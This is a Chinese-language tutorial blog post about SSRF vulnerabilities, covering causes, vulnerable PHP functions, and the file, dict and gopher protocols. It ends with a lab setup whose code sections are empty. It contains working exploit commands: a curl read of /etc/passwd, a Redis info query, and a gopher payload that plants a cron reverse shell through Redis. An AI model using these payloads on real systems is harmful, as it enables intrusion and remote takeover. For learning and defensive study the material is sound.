### 0x00 前言
学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。  
CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。  
因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！
#### 0x01 SSRF漏洞简介
**1.SSRF漏洞概述**  
SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。  
一般情况下，SSRF攻击的目标是从外网无法访问的`内部系统`。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）  
**2.SSRF漏洞产生原因**  
SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。  
如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用`存在缺陷的web应用作为代理`攻击远程和本地的服务器。
**3.容易出现SSRF的地方**
  1. 转码服务
  2. 在线翻译
  3. 图片加载与下载(通过URL地址加载或下载图片)
  4. 图片、文章收藏功能
  5. 网站采集、网页抓取的地方。
  6. 头像的地方。(远程加载头像)
  7. 一切要你输入网址的地方和可以输入ip的地方。
  8. 从URL关键字中寻找：`share`、`wap`、`url`、`link`、`src`、`source`、`target`、`u`、`3g`、`display`、`sourceURl`、`imageURL`、`domain`  
...
**4.利用SSRF可以实现的攻击**
  1. 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的[banner 信息](https://www.cnblogs.com/yuanshu/p/11588341.html)
  2. 攻击运行在内网或本地的应用程序
  3. 对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)
  4. 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)
  5. 下载内网资源(如：利用`file`协议读取本地文件等)
  6. 进行跳板
  7. 无视cdn
  8. 利用Redis未授权访问，HTTP CRLF注入实现getshell
### 0x02 SSRF漏洞相关函数和协议
**1.函数**  
`file_get_contents()`、`fsockopen()`、`curl_exec()`、`fopen()`、`readfile()`等函数使用不当会造成SSRF漏洞  
（1）file_get_contents()
>
> `file_get_content`函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。
（2）fsockopen()
>
> `fsockopen`函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限
（3）curl_exec()
> `curl_exec`函数用于执行指定的cURL会话
**注意**
    1.一般情况下PHP不会开启fopen的gopher wrapper
    2.file_get_contents的gopher协议不能URL编码
    3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
    4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
    5.curl_exec() //默认不跟踪跳转，
    6.file_get_contents() // file_get_contents支持php://input协议
**2.协议**  
（1）`file`： 在有回显的情况下，利用 file 协议可以读取任意内容  
（2）`dict`：泄露安装软件版本信息，查看端口，操作内网redis服务等  
（3）`gopher`：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell  
（4）`http/s`：探测内网主机存活
### 0x03 SSRF漏洞利用
#### 本地利用
以curl举例，查看 curl 支持的协议列表 `curl -V`。 **本地利用方式** ：  
（1）使用file协议 file protocol (任意文件读取)
    curl -vvv 'file:///etc/passwd'
（2）使用dict协议 dict protocol (获取Redis配置信息)
    curl -vvv 'dict://127.0.0.1:6379/info'
（3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash)
    curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/4444 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'
#### 远程利用
##### 1、环境
攻击机ip：192.168.201.129、121.36.67.230  
攻击机：Kali、公网服务器  
远程服务器ip：39.x.x.x  
docker镜像：ssrf_redis  
PHP版本：PHP Version 7.2.28(5.6版本测试会失败)
至于我为什么在远程服务器上部署服务，并在公网服务器上接收反弹shell?  
是因为我认为这样可以更真实的模拟真实环境。有利于自己更深刻的理解SSRF漏洞。
##### 2、远程利用示例代码
`ssrf.php`
`post.php`
        post